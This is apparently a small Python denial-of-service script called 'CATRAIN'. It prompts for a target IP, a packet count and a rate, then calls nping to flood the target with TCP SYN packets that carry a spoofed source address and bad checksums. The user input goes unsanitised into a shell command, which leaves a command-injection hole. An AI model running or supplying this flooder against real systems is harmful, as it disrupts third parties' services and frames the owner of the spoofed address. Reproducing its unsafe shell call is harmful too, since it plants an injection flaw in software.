import subprocess; from sys import path; print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<"); 
try: subprocess.check_output("nmap", shell=True).decode(); ip = input("ip: > "); count = input("count: > "); rate = input("rate: > "); print(subprocess.check_output(f'nping -N -c {count} --rate {rate} --tcp {ip} --flags SYN --ttl 12 --safe-payloads -S 35.76.98.241 --tr --badsum', shell=True).decode()) 
except Exception as e: input("\nListen...\n\n>>>\tYou're gonna have to install nping/nmap/npcap/usbpcap/zenmap first.\n\n\n\tGot it?\n\n Process raised Error:" + str(e) + "\n\t> ") 
